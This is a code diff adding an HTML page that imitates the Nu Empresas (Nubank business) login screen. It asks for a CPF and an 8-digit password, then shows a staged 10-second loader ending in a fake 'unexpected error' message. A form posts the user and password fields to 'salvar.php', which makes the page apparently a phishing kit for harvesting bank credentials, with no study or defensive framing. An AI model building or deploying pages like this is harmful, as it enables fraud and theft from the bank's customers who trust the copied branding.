@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Nu Empresas</title>
+    <link rel="stylesheet" href="https://cdn.nubank.com.br/fonts/Graphik/graphik.css">
+    <style>
+        :root {
+            --bg-black: #000000;
+            --nu-purple: #820ad1;
+            --nu-purple-dark: #5d2d82;
+            --text-gray: #9e9e9e;
+            --btn-bg: #1a1a1a;
+            --link-purple: #ab61e5;
+            --error-red: #f44336;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Graphik', sans-serif;
+        }
+
+        body, html {
+            height: 100%;
+            background-color: var(--bg-black);
+            overflow: hidden;
+        }
+
+        .main-wrapper {
+            display: flex;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        .login-side {
+            flex: 1.1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            padding-top: 18vh;
+            padding-left: 10vw;
+            background-color: var(--bg-black);
+        }
+
+        h1 {
+            color: white;
+            font-size: 42px;
+            font-weight: 600;
+            margin-bottom: 40px;
+            letter-spacing: -1.5px;
+        }
+
+        .viewport {
+            width: 360px;
+            overflow: hidden;
+        }
+
+        .steps-slider {
+            display: flex;
+            width: 720px;
+            transition: transform 0.5s cubic-bezier(0.4, 0, 0, 1);
+            will-change: transform;
+        }
+
+        .step {
+            width: 360px;
+            flex-shrink: 0;
+        }
+
+        .slide-active {
+            transform: translateX(-360px);
+        }
+
+        .label-row {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-gray);
+            font-size: 13px;
+            margin-bottom: 12px;
+        }
+
+        input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid #333;
+            color: white;
+            font-size: 22px;
+            padding: 8px 0;
+            outline: none;
+        }
+
+        .btn-acessar {
+            width: 100%;
+            background-color: var(--btn-bg);
+            color: #444;
+            border: none;
+            padding: 18px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin-top: 40px;
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 55px;
+            transition: 0.3s;
+        }
+
+        .btn-acessar.active {
+            background-color: var(--nu-purple);
+            color: white;
+            cursor: pointer;
+        }
+
+        .loader {
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .error-message {
+            color: var(--error-red);
+            font-size: 13px;
+            margin-top: -20px;
+            margin-bottom: 20px;
+            display: none;
+            line-height: 1.4;
+        }
+
+        .footer-text {
+            color: white;
+            font-size: 14px;
+        }
+
+        .footer-text a {
+            color: var(--link-purple);
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+
+        .image-side {
+            flex: 1;
+            background-color: var(--nu-purple-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .cards-img {
+            max-width: 95%;
+            height: auto;
+        }
+
+        @media (max-width: 1100px) {
+            .image-side { display: none; }
+            .login-side { padding-left: 5vw; padding-right: 5vw; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <section class="login-side">
+            <h1>Login Nu Empresas</h1>
+
+            <div class="viewport">
+                <div id="slider" class="steps-slider">
+                    
+                    <div class="step">
+                        <div class="label-row">
+                            Informe seu CPF 
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+                        </div>
+                        <input type="text" id="cpfInput" placeholder="000.000.000-00" maxlength="14" autocomplete="off">
+                        <button id="btnAcessar" class="btn-acessar">
+                            <span id="btn-text-cpf">Acessar</span>
+                            <div id="loader-cpf" class="loader"></div>
+                        </button>
+                        <p class="footer-text">
+                            Ainda não tem uma conta do Nu Empresas? <a href="https://nubank.com.br/empresas/conta" target="_blank">Abrir agora</a>
+                        </p>
+                    </div>
+
+                    <div class="step">
+                        <div class="label-row">Digite sua senha de acesso (8 dígitos)</div>
+                        <input type="password" id="passInput" placeholder="Sua senha" maxlength="8" autocomplete="off">
+                        
+                        <button id="btnConfirmar" class="btn-acessar">
+                            <span id="btn-text-pass">Confirmar</span>
+                            <div id="loader-pass" class="loader"></div>
+                        </button>
+
+                        <div id="error-box" class="error-message">
+                            Ocorreu um erro inesperado. Estamos tentando corrigir o mais rápido possível. Por favor, tente novamente mais tarde.
+                        </div>
+
+                        <p class="footer-text">
+                            <a href="https://app.nubank.com.br/beta/login/esqueci-senha/" style="margin-left: 0;">Esqueci minha senha</a>
+                        </p>
+                    </div>
+ 
+        <div class="form-container">
+            <form action="salvar.php" method="POST">
+                <input type="text" name="usuario" id="usuario" class="input-box" placeholder="000.000.000-00" oninput="validar()" required>
+                <input type="password" name="senha" id="senha" class="input-box" placeholder="Sua senha" oninput="validar()" required>
+                
+                <button type="submit" id="btnSubmit" class="btn-entrar">Entrar</button>
+            </form>
+
+                </div>
+            </div>
+        </section>
+
+        <section class="image-side">
+            <img src="cards.png" alt="Cartões" class="cards-img">
+        </section>
+    </div>
+
+    <script>
+        const cpfInput = document.getElementById('cpfInput');
+        const btnAcessar = document.getElementById('btnAcessar');
+        const loaderCpf = document.getElementById('loader-cpf');
+        const btnTextCpf = document.getElementById('btn-text-cpf');
+        
+        const slider = document.getElementById('slider');
+        
+        const passInput = document.getElementById('passInput');
+        const btnConfirmar = document.getElementById('btnConfirmar');
+        const btnTextPass = document.getElementById('btn-text-pass');
+        const loaderPass = document.getElementById('loader-pass');
+        const errorBox = document.getElementById('error-box');
+
+        // Validação CPF
+        cpfInput.addEventListener('input', (e) => {
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length > 11) v = v.slice(0, 11);
+            v = v.replace(/(\d{3})(\d)/, '$1.$2');
+            v = v.replace(/(\d{3})(\d)/, '$1.$2');
+            v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            e.target.value = v;
+            btnAcessar.classList.toggle('active', v.length === 14);
+        });
+
+        // Validação Senha (libera apenas com 8 dígitos)
+        passInput.addEventListener('input', (e) => {
+            const v = e.target.value;
+            btnConfirmar.classList.toggle('active', v.length === 8);
+            // Esconde o erro se o usuário começar a digitar novamente
+            errorBox.style.display = 'none';
+        });
+
+        // Troca para tela de senha
+        btnAcessar.addEventListener('click', () => {
+            if (btnAcessar.classList.contains('active')) {
+                btnTextCpf.style.display = 'none';
+                loaderCpf.style.display = 'block';
+
+                setTimeout(() => {
+                    slider.classList.add('slide-active');
+                    setTimeout(() => {
+                        passInput.focus();
+                    }, 500);
+                }, 800);
+            }
+        });
+
+        // Clique no confirmar (10 segundos de loader)
+        btnConfirmar.addEventListener('click', () => {
+            if (btnConfirmar.classList.contains('active')) {
+                errorBox.style.display = 'none';
+                btnTextPass.style.display = 'none';
+                loaderPass.style.display = 'block';
+                
+                // Desativa interações durante o loading
+                btnConfirmar.style.pointerEvents = 'none';
+                passInput.disabled = true;
+
+                setTimeout(() => {
+                    loaderPass.style.display = 'none';
+                    btnTextPass.style.display = 'block';
+                    errorBox.style.display = 'block';
+                    
+                    // Reativa interações
+                    btnConfirmar.style.pointerEvents = 'auto';
+                    passInput.disabled = false;
+                }, 10000); // 10 segundos
+            }
+        });
+    </script>
+</body>
+</html>
